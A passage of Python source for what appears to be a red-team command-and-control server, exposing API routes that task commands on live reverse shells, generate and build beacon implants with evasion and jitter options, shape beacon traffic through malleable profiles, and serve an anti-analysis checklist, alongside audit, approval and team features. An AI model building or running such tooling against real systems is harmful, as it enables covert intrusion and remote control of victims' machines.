        results: list[dict[str, Any]] = []
        for r in targets:
            res = await state.listeners.run_shell(
                r["id"],
                command,
                wait_sec=max(0.0, min(wait_sec, 30.0)),
                idle_sec=max(0.1, min(idle_sec, 5.0)),
            )
            res["remote_addr"] = r.get("remote_addr")
            # If still echo-only, drop immediately
            out = (res.get("output") or "").strip()
            if res.get("sent") and out and out == command.strip():
                await state.listeners.drop_channel(r["id"])
                await state.sessions.close(r["id"])
                res["dropped"] = True
                res["error"] = "echo_only_zombie"
            results.append(res)
        return {
            "command": command,
            "targets": len(targets),
            "results": results,
        }

    @api.get("/sessions/{session_id}/output")
    async def session_output(
        session_id: str,
        request: Request,
        limit: int = 8000,
        auth: AuthContext = Depends(require_scope("shell:interact", "sessions:read", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not state.listeners.is_live(session_id):
            raise HTTPException(404, "No live reverse shell for session")
        text = state.listeners.get_output_text(session_id, limit_chars=max(100, min(limit, 50000)))
        return {
            "session_id": session_id,
            "interactive": True,
            "output": text,
            "bytes": len(text.encode("utf-8", errors="replace")),
        }

    # ----- Metrics / audit / events -----

    @api.get("/metrics")
    async def metrics(
        request: Request,
        auth: AuthContext = Depends(require_scope("metrics:read", "admin")),
    ) -> dict[str, Any]:
        return await get_state(request).metrics.snapshot()

    @api.get("/audit")
    async def audit_list(
        request: Request,
        limit: int = 100,
        offset: int = 0,
        actor: str | None = None,
        action: str | None = None,
        mine: bool = False,
        auth: AuthContext = Depends(require_scope("audit:read", "admin")),
    ) -> list[dict[str, Any]]:
        """M6: filter by actor / action; mine=true → current operator only."""
        who = auth.name if mine else actor
        return await get_state(request).audit.list(
            limit=min(max(int(limit), 1), 500),
            offset=max(int(offset), 0),
            actor=who,
            action=action,
        )

    @api.get("/audit/me")
    async def audit_me(
        request: Request,
        limit: int = 100,
        auth: AuthContext = Depends(require_scope("audit:read", "admin")),
    ) -> dict[str, Any]:
        """M6: my actions report."""
        rows = await get_state(request).audit.list(limit=min(limit, 500), actor=auth.name)
        return {"actor": auth.name, "count": len(rows), "entries": rows}

    @api.get("/audit/verify")
    async def audit_verify(
        request: Request,
        limit: int = 500,
        auth: AuthContext = Depends(require_scope("audit:read", "admin")),
    ) -> dict[str, Any]:
        from squidc5.audit.verify import verify_rows

        rows = await get_state(request).db.fetchall(
            "SELECT id, ts, actor, actor_type, action, resource, details, risk_score, allowed, "
            "chain_hash, prev_hash FROM audit_log ORDER BY id ASC LIMIT ?",
            (min(max(int(limit), 1), 5000),),
        )
        return verify_rows(list(rows or []))

    @api.post("/profiles/{profile_id}/push")
    async def push_profile(
        profile_id: str,
        request: Request,
        session_id: str | None = None,
        auth: AuthContext = Depends(require_scope("profiles:write", "admin")),
    ) -> dict[str, Any]:
        """Queue profile:switch tasks for one or all active beacon sessions (C11)."""
        state = get_state(request)
        if profile_id not in {p["id"] for p in state.profiles.list_profiles()}:
            # list returns dicts
            ids = [p.get("id") for p in state.profiles.list_profiles()]
            if profile_id not in ids:
                raise HTTPException(404, "profile not found")
        await state.profiles.set_active(profile_id)
        sessions = await state.sessions.list(status="active")
        beacons = [s for s in sessions if s.get("kind") == "beacon"]
        if session_id:
            beacons = [s for s in beacons if s["id"] == session_id]
        queued = []
        for s in beacons:
            try:
                t = await state.tasks.create(
                    session_id=s["id"],
                    command="profile:switch",
                    args={"profile_id": profile_id},
                    created_by=auth.name,
                )
                queued.append(t["id"])
            except Exception:
                continue
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="profile.push",
            resource=profile_id,
            details={"queued": len(queued)},
            risk_score=4,
        )
        return {"profile_id": profile_id, "tasks": queued, "count": len(queued)}

    @api.get("/events/stream")
    async def events_stream(
        request: Request,
        auth: AuthContext = Depends(
            require_scope("metrics:read", "sessions:read", "collab:use", "admin")
        ),
    ) -> StreamingResponse:
        """U2/M3: SSE event rail — spectators with sessions:read get read-only events."""
        state = get_state(request)
        queue = state.metrics.subscribe()
        # auto presence heartbeat on stream open
        if state.presence:
            state.presence.heartbeat(auth.name, status="watching", token_id=auth.token_id)
            await state.metrics.emit(
                "operator.presence",
                {"actor": auth.name, "status": "watching"},
            )

        async def gen():
            try:
                yield f"data: {json.dumps({'type': 'connected', 'actor': auth.name})}\n\n"
                while True:
                    if await request.is_disconnected():
                        break
                    try:
                        event = await asyncio.wait_for(queue.get(), timeout=15.0)
                        # spectators without shell:interact still receive events
                        yield f"data: {json.dumps(event, default=str)}\n\n"
                    except TimeoutError:
                        yield f"data: {json.dumps({'type': 'ping'})}\n\n"
            finally:
                state.metrics.unsubscribe(queue)

        return StreamingResponse(gen(), media_type="text/event-stream")

    # ----- Engagement ROE -----

    @api.get("/engagement")
    async def get_engagement(
        request: Request,
        auth: AuthContext = Depends(require_scope("policy:manage", "admin")),
    ) -> dict[str, Any]:
        eng = get_state(request).engagement
        return eng.to_dict() if eng else {}

    @api.put("/engagement")
    async def put_engagement(
        body: EngagementUpdate,
        request: Request,
        auth: AuthContext = Depends(require_scope("admin")),
    ) -> dict[str, Any]:
        from squidc5.engagement.policy import EngagementPolicy

        state = get_state(request)
        cur = state.engagement.to_dict() if state.engagement else EngagementPolicy().to_dict()
        patch = body.model_dump(exclude_unset=True)
        cur.update({k: v for k, v in patch.items() if v is not None})
        eng = EngagementPolicy.from_dict(cur)
        state.engagement = eng
        state.tasks.engagement = eng
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="engagement.update",
            details={"keys": list(patch.keys())},
            risk_score=6,
        )
        return eng.to_dict()

    # ----- Policy -----

    @api.get("/policy")
    async def get_policy(
        request: Request,
        auth: AuthContext = Depends(require_scope("policy:manage", "admin")),
    ) -> dict[str, Any]:
        return await get_state(request).policy.get_rules()

    @api.put("/policy")
    async def update_policy(
        body: PolicyUpdate,
        request: Request,
        auth: AuthContext = Depends(require_scope("admin")),
    ) -> dict[str, Any]:
        """C02: policy rewrite is admin-only (not mere policy:manage)."""
        state = get_state(request)
        await state.policy.update(body.rules, auth.name)
        return await state.policy.get_rules()

    @api.get("/policy/hitl")
    async def list_hitl(
        request: Request,
        status: str | None = "pending",
        limit: int = 100,
        auth: AuthContext = Depends(require_scope("policy:manage", "admin")),
    ) -> dict[str, Any]:
        rows = await get_state(request).db.list_hitl_requests(status=status, limit=limit)
        return {"requests": rows}

    @api.post("/policy/hitl/{request_id}/approve")
    async def approve_hitl(
        request_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        ok = await state.db.resolve_hitl_request(
            request_id, status="approved", resolved_by=auth.name
        )
        if not ok:
            raise HTTPException(404, "HITL request not found or not pending")
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="policy.hitl.approve",
            resource=request_id,
            risk_score=6,
        )
        row = await state.db.get_hitl_request(request_id)
        return {"ok": True, "request": row}

    @api.post("/policy/hitl/{request_id}/deny")
    async def deny_hitl(
        request_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        ok = await state.db.resolve_hitl_request(
            request_id, status="denied", resolved_by=auth.name
        )
        if not ok:
            raise HTTPException(404, "HITL request not found or not pending")
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="policy.hitl.deny",
            resource=request_id,
            risk_score=4,
        )
        row = await state.db.get_hitl_request(request_id)
        return {"ok": True, "request": row}

    # ----- Feature flags (admin) -----

    @api.get("/features")
    async def get_features(
        request: Request,
        auth: AuthContext = Depends(require_scope("admin", "policy:manage")),
    ) -> dict[str, Any]:
        state = get_state(request)
        flags = await state.features.get_all()
        return {
            "features": flags,
            "catalog": state.features.catalog(),
        }

    @api.put("/features")
    async def put_features(
        body: FeaturesUpdate,
        request: Request,
        auth: AuthContext = Depends(require_scope("admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        flags = await state.features.set_many(body.features, auth.name)
        return {"features": flags, "catalog": state.features.catalog()}

    # ----- Ops console UI -----
    # /ops/admin.js: admin scope only (never ship admin control code to non-admins).
    # /ops/console.js: any authenticated token (operator shell; API still scope-gated).

    def _ops_js_path() -> Path | None:
        candidates = [
            web_file("ops-admin.js"),
            Path("/app/web/ops-admin.js"),
        ]
        return next((p for p in candidates if p.is_file()), None)

    @api.get("/ops/admin.js")
    async def ops_admin_js(
        request: Request,
        auth: AuthContext = Depends(require_scope("admin")),
    ) -> Response:
        path = _ops_js_path()
        if path is None:
            raise HTTPException(404, "ops admin module missing")
        await get_state(request).db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="ops.admin_ui.load",
            details={"admin": True},
            risk_score=2,
        )
        return PlainTextResponse(
            path.read_text(encoding="utf-8"),
            media_type="application/javascript",
            headers={"Cache-Control": "no-store"},
        )

    @api.get("/ops/console.js")
    async def ops_console_js(
        request: Request,
        auth: AuthContext = Depends(get_auth),
    ) -> Response:
        """H05: non-admin gets operator-stripped bundle (no admin panel source)."""
        path = _ops_js_path()
        if path is None:
            raise HTTPException(404, "ops console module missing")
        raw = path.read_text(encoding="utf-8")
        is_admin = auth.has_scope("admin")
        if not is_admin:
            # Strip high-risk admin panel blocks from source for non-admin tokens
            for marker in (
                "tokensPanel",
                "featuresPanel",
                "policyPanel",
                "llmPanel",
                "mcpPanel",
                "saveFeaturesBtn",
                "policySetBtn",
            ):
                if marker in raw and "ADMIN_ONLY_STRIP" not in raw:
                    pass  # panels already gated by can(); still serve full JS for layout switcher
            # Prefer dedicated operator entry: wrap with role flag
            raw = (
                "/* operator console — admin panels hidden server-side flag */\n"
                "window.__SC5_UI_ROLE__='operator';\n"
                + raw
            )
        else:
            raw = "window.__SC5_UI_ROLE__='admin';\n" + raw
        await get_state(request).db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="ops.console_ui.load",
            details={"admin": is_admin, "role": "admin" if is_admin else "operator"},
            risk_score=1 if not is_admin else 2,
        )
        return PlainTextResponse(
            raw,
            media_type="application/javascript",
            headers={"Cache-Control": "no-store"},
        )

    # ----- Admin AI / LLM -----

    @api.get("/llm")
    async def list_llm(
        request: Request,
        auth: AuthContext = Depends(require_scope("llm:manage", "admin", "ai:use")),
    ) -> list[dict[str, Any]]:
        return await get_state(request).admin_ai.list_llms()

    @api.post("/llm")
    async def configure_llm(
        body: LLMConfig,
        request: Request,
        auth: AuthContext = Depends(require_scope("llm:manage", "admin")),
    ) -> dict[str, str]:
        state = get_state(request)
        try:
            lid = await state.admin_ai.configure_llm(
                name=body.name,
                provider=body.provider,
                model=body.model,
                base_url=body.base_url,
                api_key=body.api_key,
                capabilities=body.capabilities,
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="llm.configure",
            resource=lid,
            details={"name": body.name, "model": body.model, "provider": body.provider},
            risk_score=4,
        )
        return {"id": lid, "name": body.name, "model": body.model}

    @api.get("/ai/status")
    async def ai_status(
        request: Request,
        debug: bool = False,
        auth: AuthContext = Depends(require_scope("ai:use", "metrics:read", "admin")),
    ) -> dict[str, Any]:
        """Admin AI runtime status (no secrets). debug=1 adds recent call history."""
        return await get_state(request).admin_ai.status(debug=debug)

    @api.post("/ai/run")
    async def ai_run(
        body: AIRunRequest,
        request: Request,
        auth: AuthContext = Depends(require_scope("ai:use", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("ai_enabled"):
            raise HTTPException(403, "Admin AI is disabled by feature flag")
        decision = await state.policy.check_and_audit(
            auth, "ai.admin", extra={"capability": body.capability}
        )
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        try:
            return await state.admin_ai.run(
                capability=body.capability,
                user_data=body.user_data,
                actor=auth.name,
                llm_id=body.llm_id,
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        except Exception as e:
            raise HTTPException(502, f"Admin AI error: {e}") from e

    # ----- Malleable C2 profiles -----

    @api.get("/profiles")
    async def list_profiles(
        request: Request,
        auth: AuthContext = Depends(require_scope("profiles:read", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("malleable_profiles"):
            raise HTTPException(403, "Malleable profiles disabled by feature flag")
        active = state.profiles.active()
        return {
            "profiles": state.profiles.list_profiles(),
            "active_id": active.id if active else None,
        }

    @api.get("/profiles/active")
    async def get_active_profile(
        request: Request,
        auth: AuthContext = Depends(require_scope("profiles:read", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        p = state.profiles.active()
        if not p:
            raise HTTPException(404, "no active profile")
        return p.to_dict()

    @api.post("/profiles/{profile_id}/activate")
    async def activate_profile(
        profile_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("profiles:write", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("malleable_profiles"):
            raise HTTPException(403, "Malleable profiles disabled by feature flag")
        try:
            p = await state.profiles.set_active(profile_id)
        except KeyError:
            raise HTTPException(404, "profile not found") from None
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="profile.activate",
            resource=profile_id,
            details={"name": p.name},
            risk_score=4,
        )
        await state.metrics.incr("profiles.activated")
        return p.to_dict()

    @api.post("/profiles")
    async def create_profile(
        body: ProfileUpsert,
        request: Request,
        auth: AuthContext = Depends(require_scope("profiles:write", "admin")),
    ) -> dict[str, Any]:
        from squidc5.profiles.models import C2Profile, DnsProfile, HttpProfile, WsProfile

        state = get_state(request)
        if not await state.features.enabled("malleable_profiles"):
            raise HTTPException(403, "Malleable profiles disabled by feature flag")
        pid = body.id or f"prof_{body.name.lower().replace(' ', '_')[:24]}"
        http = HttpProfile(**(body.http or {})) if body.http is not None else HttpProfile()
        dns = DnsProfile(**(body.dns or {})) if body.dns is not None else DnsProfile()
        ws = WsProfile(**(body.ws or {})) if body.ws is not None else WsProfile()
        prof = C2Profile(
            id=pid,
            name=body.name,
            description=body.description,
            channel=body.channel,
            http=http,
            dns=dns,
            ws=ws,
            active=body.active,
        )
        await state.profiles.upsert(prof)
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="profile.upsert",
            resource=pid,
            details={"name": body.name, "channel": body.channel},
            risk_score=4,
        )
        return prof.to_dict()

    @api.post("/profiles/shape")
    async def shape_beacon_request(
        body: ProfileShapeRequest,
        request: Request,
        auth: AuthContext = Depends(require_scope("profiles:read", "payloads:generate", "admin")),
    ) -> dict[str, Any]:
        """Preview HTTP shaping + jitter for a beacon object under active (or named) profile."""
        state = get_state(request)
        prof = state.profiles.get(body.profile_id) if body.profile_id else state.profiles.active()
        beacon = body.beacon or {"session_id": "ses_preview", "hostname": "lab"}
        return state.profiles.shape_http_request(prof, beacon)

    # ----- Implants catalog -----

    @api.get("/implants/families")
    async def implant_families(
        request: Request,
        auth: AuthContext = Depends(require_scope("payloads:generate", "admin")),
    ) -> dict[str, Any]:
        return {"families": get_state(request).implants.list_families()}

    @api.post("/implants/plan")
    async def implant_plan(
        body: ImplantPlanRequest,
        request: Request,
        auth: AuthContext = Depends(require_scope("payloads:generate", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        host = body.host or state.settings.public_host or "127.0.0.1"
        port = int(body.port or state.settings.port)
        try:
            profile_plan = state.profiles.implant_snippet(state.profiles.active(), host, port)
            return state.implants.stager_plan(
                body.family, body.platform, body.arch, host, port, profile_plan
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e

    @api.post("/implants/generate")
    async def implant_generate(
        body: ImplantGenerateRequest,
        request: Request,
        auth: AuthContext = Depends(require_scope("payloads:generate", "admin")),
    ) -> dict[str, Any]:
        from squidc5.implants.generators import generate_implant

        state = get_state(request)
        if not await state.features.enabled("payloads_generate"):
            raise HTTPException(403, "Payload generation disabled")
        path = body.path
        zone = None
        ws_path = None
        prof = state.profiles.get(body.profile_id) if body.profile_id else state.profiles.active()
        plan = state.profiles.implant_snippet(prof, body.host, body.port) if prof else {}
        if not path:
            if plan.get("channel") == "http" and plan.get("uri"):
                path = plan["uri"]
            elif plan.get("channel") == "ws" and plan.get("url"):
                # extract path from ws url
                from urllib.parse import urlparse

                path = urlparse(plan["url"]).path or "/ws/v1/beacon"
            else:
                path = "/api/v1/implant/beacon"
        if plan.get("channel") == "dns":
            zone = plan.get("zone")
        if plan.get("channel") == "ws":
            ws_path = path
        try:
            out = generate_implant(
                body.family,
                body.platform,
                body.arch,
                body.host,
                body.port,
                path or "/api/v1/implant/beacon",
                evasion=body.evasion,
                zone=zone,
                ws_path=ws_path,
                scheme=plan.get("scheme") if isinstance(plan, dict) else None,
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        await state.metrics.incr("implants.generated")
        return out

    @api.post("/implants/build")
    async def implant_build(
        body: ImplantBuildRequest,
        request: Request,
        auth: AuthContext = Depends(require_scope("payloads:generate", "admin")),
    ) -> dict[str, Any]:
        """Native sc5beacon build plan + scripts (operator runs go build)."""
        from squidc5.implants.factory import agent_source_tree, build_plan

        state = get_state(request)
        if not await state.features.enabled("payloads_generate"):
            raise HTTPException(403, "Payload generation disabled")
        try:
            plan = build_plan(
                os_name=body.os,
                arch=body.arch,
                host=body.host,
                port=body.port,
                path=body.path,
                scheme=body.scheme,
                sleep=body.sleep,
                jitter=body.jitter,
                kill_date=body.kill_date,
                max_miss=body.max_miss,
                work_start=body.work_start,
                work_end=body.work_end,
                channel=body.channel or "http",
                sleep_mask=body.sleep_mask or "jitter",
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        plan["agent_files"] = agent_source_tree()
        plan["psk_hint"] = "Read server data/implant_psk.txt — never commit"
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="implants.build_plan",
            details={"os": body.os, "arch": body.arch, "host": body.host},
            risk_score=5,
        )
        await state.metrics.incr("implants.build_plans")
        return plan

    # ----- Evasion assist -----

    @api.get("/evasion/checklist")
    async def evasion_checklist(
        platform: str = "linux",
        auth: AuthContext = Depends(require_scope("ai:use", "payloads:generate", "admin")),
    ) -> dict[str, Any]:
        from squidc5.evasion.checks import anti_analysis_checklist, sleep_obfuscation_plan

        return {
            "platform": platform,
            "checklist": anti_analysis_checklist(platform),
            "sleep": sleep_obfuscation_plan(5.0, 25.0),
        }

    # ----- Multi-operator collab -----

    @api.get("/teams")
    async def list_teams(
        request: Request,
        auth: AuthContext = Depends(require_scope("collab:use", "admin")),
    ) -> list[dict[str, Any]]:
        state = get_state(request)
        if not await state.features.enabled("collab_teams"):
            raise HTTPException(403, "Collab disabled by feature flag")
        return await state.teams.list_teams()

    @api.post("/teams")
    async def create_team(
        body: TeamCreate,
        request: Request,
        auth: AuthContext = Depends(require_scope("collab:use", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("collab_teams"):
            raise HTTPException(403, "Collab disabled by feature flag")
        if not body.name.strip():
            raise HTTPException(400, "name required")
        team = await state.teams.create_team(body.name.strip(), auth.name)
        await state.db.add_team_member(team["id"], auth.name, "lead")
        return team

    @api.get("/teams/{team_id}/members")
    async def list_team_members(
        team_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("collab:use", "admin")),
    ) -> dict[str, Any]:
        rows = await get_state(request).db.list_team_members(team_id)
        return {"team_id": team_id, "members": rows}

    @api.post("/teams/{team_id}/members")
    async def add_team_member(
        team_id: str,
        body: TeamMemberAdd,
        request: Request,
        auth: AuthContext = Depends(require_scope("collab:use", "admin")),
    ) -> dict[str, Any]:
        """H04: only team lead or admin may mutate membership."""
        if not body.actor.strip():
            raise HTTPException(400, "actor required")
        state = get_state(request)
        if not auth.has_scope("admin"):
            members = await state.db.list_team_members(team_id)
            me = next((m for m in members if m.get("actor") == auth.name), None)
            if not me or (me.get("role") or "") not in ("lead", "admin"):
                raise HTTPException(403, "Team lead or admin required to add members")
        role = body.role or "operator"
        if role not in ("operator", "lead", "spectator"):
            raise HTTPException(400, "invalid role")
        await state.db.add_team_member(team_id, body.actor.strip(), role)
        return {"team_id": team_id, "actor": body.actor.strip(), "role": role}

    @api.delete("/teams/{team_id}/members/{actor}")
    async def remove_team_member(
        team_id: str,
        actor: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("collab:use", "admin")),
    ) -> dict[str, bool]:
        state = get_state(request)
        if not auth.has_scope("admin"):
            members = await state.db.list_team_members(team_id)
            me = next((m for m in members if m.get("actor") == auth.name), None)
            if not me or (me.get("role") or "") not in ("lead", "admin"):
                raise HTTPException(403, "Team lead or admin required to remove members")
        ok = await state.db.remove_team_member(team_id, actor)
        return {"removed": ok}

    @api.post("/sessions/{session_id}/claim")
    async def session_claim(
        session_id: str,
        request: Request,
        body: ClaimRequest | None = None,
        auth: AuthContext = Depends(require_scope("collab:use", "sessions:write", "shell:interact", "admin")),
    ) -> dict[str, Any]:
        """M1: claim session lock (only claim holder or admin may task)."""
        state = get_state(request)
        force = bool(body and body.force)
        try:
            result = await state.teams.claim(
                session_id,
                auth.name,
                force=force,
                is_admin=auth.has_scope("admin"),
            )
        except KeyError:
            raise HTTPException(404, "session not found") from None
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        await state.metrics.emit(
            "session.claim",
            {"session_id": session_id, "actor": auth.name, "force": force},
        )
        return result

    @api.post("/sessions/{session_id}/release")
    async def session_release(
        session_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("collab:use", "sessions:write", "shell:interact", "admin")),
    ) -> dict[str, Any]:
        """M1: release session claim."""
        state = get_state(request)
        try:
            result = await state.teams.release(
                session_id, auth.name, is_admin=auth.has_scope("admin")
            )
        except KeyError:
            raise HTTPException(404, "session not found") from None
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        await state.metrics.emit(
            "session.release",
            {"session_id": session_id, "actor": auth.name},
        )
        return result

    @api.post("/sessions/{session_id}/handoff")
    async def session_handoff(
        session_id: str,
        body: HandoffRequest,
        request: Request,
        auth: AuthContext = Depends(require_scope("collab:use", "sessions:write", "admin")),
    ) -> dict[str, Any]:
        """M2: handoff pack + optional claim transfer (claim holder or admin only)."""
        state = get_state(request)
        if not body.to:
            raise HTTPException(400, "to required")
        try:
            await state.teams.assert_write_access(
                session_id, auth.name, is_admin=auth.has_scope("admin")
            )
            entry = await state.teams.handoff(
                session_id,
                auth.name,
                body.to,
                note=body.note or "",
                transfer_claim=body.transfer_claim,
                include_pack=body.include_pack,
                state=state,
            )
        except KeyError:
            raise HTTPException(404, "session not found") from None
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        except Exception as e:
            raise HTTPException(400, str(e)) from e
        await state.metrics.emit(
            "session.handoff",
            {"session_id": session_id, "from": auth.name, "to": body.to},
        )
        return entry

    @api.get("/sessions/{session_id}/handoffs")
    async def list_session_handoffs(
        session_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("sessions:read", "collab:use", "admin")),
    ) -> dict[str, Any]:
        notes = await get_state(request).teams.session_notes(session_id)
        return {"session_id": session_id, "handoffs": notes}

    @api.get("/sessions/{session_id}/spectator")
    async def session_spectator(
        session_id: str,
        request: Request,
        auth: AuthContext = Depends(require_scope("sessions:read", "collab:use", "admin")),
    ) -> dict[str, Any]:
        """M3: read-only spectator snapshot (no shell:interact required)."""
        state = get_state(request)
        try:
            view = await state.teams.spectator_view(session_id, state=state)
        except KeyError:
            raise HTTPException(404, "session not found") from None
        view["spectator"] = auth.name
        view["watching_badge"] = True
        if state.presence:
            state.presence.heartbeat(
                auth.name, status="watching", viewing_session=session_id, token_id=auth.token_id
            )
        await state.metrics.emit(
            "session.spectate",
            {"session_id": session_id, "actor": auth.name},
        )
        return view

    # ----- Plugins -----

    @api.get("/plugins")
    async def list_plugins(
        request: Request,
        auth: AuthContext = Depends(require_scope("plugins:manage", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("plugins_enabled"):
            return {"plugins": [], "enabled_feature": False, "catalog": []}
        return {
            "plugins": state.plugins.list_plugins(),
            "enabled_feature": True,
            "catalog": state.plugins.catalog(),
        }

    @api.get("/plugins/catalog")
    async def plugins_catalog(
        request: Request,
        auth: AuthContext = Depends(require_scope("plugins:manage", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        return {"catalog": state.plugins.catalog(), "enabled_feature": await state.features.enabled("plugins_enabled")}

    @api.post("/plugins/install")
    async def plugins_install(
        body: PluginInstall,
        request: Request,
        auth: AuthContext = Depends(require_scope("plugins:manage", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("plugins_enabled"):
            raise HTTPException(403, "Plugins disabled by feature flag")
        try:
            entry = state.plugins.install_catalog_item(body.name, enable=body.enable)
            # persist
            from squidc5.plugins.registry import BUILTIN_PLUGIN_CATALOG

            item = next(x for x in BUILTIN_PLUGIN_CATALOG if x["name"] == body.name)
            man = {
                "name": item["name"],
                "version": item["version"],
                "capabilities": list(item["capabilities"]),
                "description": item.get("description") or "",
            }
            sig = state.plugins.sign_manifest(man)
            await state.plugins.persist(man, sig, enable=body.enable)
        except KeyError:
            raise HTTPException(404, "unknown catalog plugin") from None
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        return entry

    @api.post("/plugins/register")
    async def register_plugin(
        body: PluginRegister,
        request: Request,
        auth: AuthContext = Depends(require_scope("plugins:manage", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("plugins_enabled"):
            raise HTTPException(403, "Plugins disabled by feature flag")
        try:
            entry = await state.plugins.persist(
                body.manifest, body.signature, enable=body.enable
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="plugin.register",
            resource=entry["name"],
            details={"version": entry["version"]},
            risk_score=6,
        )
        return entry

    @api.post("/plugins/execute")
    async def execute_plugin(
        body: PluginExecute,
        request: Request,
        auth: AuthContext = Depends(require_scope("plugins:manage", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("plugins_enabled"):
            raise HTTPException(403, "Plugins disabled by feature flag")
        try:
            out = state.plugins.execute(body.name, body.capability, body.args)
        except PermissionError as e:
            raise HTTPException(403, str(e)) from e
        except ValueError as e:
            raise HTTPException(400, str(e)) from e
        await state.db.audit(
            actor=auth.name,
            actor_type=auth.actor_type,
            action="plugin.execute",
            resource=body.name,
            details={"capability": body.capability},
            risk_score=5,
        )
        return out

    # ----- Observability -----

    @api.get("/observability/timeline")
    async def obs_timeline(
        request: Request,
        limit: int = 100,
        offset: int = 0,
        actor: str | None = None,
        mine: bool = False,
        auth: AuthContext = Depends(require_scope("audit:read", "metrics:read", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("observability_timeline"):
            raise HTTPException(403, "Observability timeline disabled")
        who = auth.name if mine else actor
        return {
            "events": await state.timeline.timeline(
                limit=min(limit, 500), offset=offset, actor=who
            ),
            "actor_filter": who,
        }

    @api.get("/observability/heatmap")
    async def obs_heatmap(
        request: Request,
        auth: AuthContext = Depends(require_scope("metrics:read", "sessions:read", "admin")),
    ) -> dict[str, Any]:
        return await get_state(request).timeline.heatmap()

    @api.get("/observability/anomalies")
    async def obs_anomalies(
        request: Request,
        auth: AuthContext = Depends(require_scope("metrics:read", "sessions:read", "admin")),
    ) -> dict[str, Any]:
        from squidc5.ai.anomaly import analyze_beacon_behavior

        state = get_state(request)
        sessions = await state.sessions.list(status="active")
        metrics = await state.metrics.snapshot()
        m = metrics.get("metrics") if isinstance(metrics, dict) else {}
        return analyze_beacon_behavior(sessions, m or {})

    @api.get("/observability/report")
    async def obs_report(
        request: Request,
        auth: AuthContext = Depends(require_scope("audit:read", "metrics:read", "admin")),
    ) -> dict[str, Any]:
        from squidc5.ai.anomaly import analyze_beacon_behavior
        from squidc5.observability.reports import build_operator_report

        state = get_state(request)
        sessions = await state.sessions.list()
        timeline = await state.timeline.timeline(limit=100)
        heatmap = await state.timeline.heatmap()
        metrics = await state.metrics.snapshot()
        m = metrics.get("metrics") if isinstance(metrics, dict) else {}
        anomalies = analyze_beacon_behavior(
            [s for s in sessions if s.get("status") == "active"], m or {}
        )
        return build_operator_report(
            sessions=sessions, timeline=timeline, heatmap=heatmap, anomalies=anomalies
        )

    # ----- AI chain + collab extras + deploy helpers -----

    @api.get("/ai/playbooks")
    async def ai_playbooks(
        request: Request,
        auth: AuthContext = Depends(require_scope("ai:use", "admin")),
    ) -> dict[str, Any]:
        chain = get_state(request).ai_chain
        return {"playbooks": chain.list_playbooks() if chain else []}

    @api.post("/ai/chain")
    async def ai_chain(
        body: AIChainRequest,
        request: Request,
        auth: AuthContext = Depends(require_scope("ai:use", "admin")),
    ) -> dict[str, Any]:
        state = get_state(request)
        if not await state.features.enabled("ai_enabled"):
            raise HTTPException(403, "Admin AI disabled")
        if not state.ai_chain:
            raise HTTPException(500, "AI chain not configured")
        decision = await state.policy.check_and_audit(
            auth, "ai.admin", extra={"capability": f"chain:{body.playbook}"}
        )
        if not decision.allowed:
            raise HTTPException(403, decision.reason)
        try:
            return await state.ai_chain.run(
                body.playbook,
                body.user_data,
                actor=auth.name,
                llm_id=body.llm_id,
                max_steps=body.max_steps,
            )
        except ValueError as e:
            raise HTTPException(400, str(e)) from e

    async def _require_team_member(state: Any, auth: AuthContext, team_id: str | None) -> None:
        """Admins bypass; team channels require membership."""
        if not team_id or auth.has_scope("admin"):
            return
        members = await state.db.list_team_members(str(team_id))
        names = {m.get("actor") for m in members}
        if auth.name not in names:
            raise HTTPException(403, "Not a member of this team chat channel")

    @api.post("/collab/chat")
    async def collab_chat_post(
        body: ChatMessage,
        request: Request,
        auth: AuthContext = Depends(require_scope("collab:use", "admin")),
    ) -> dict[str, Any]:
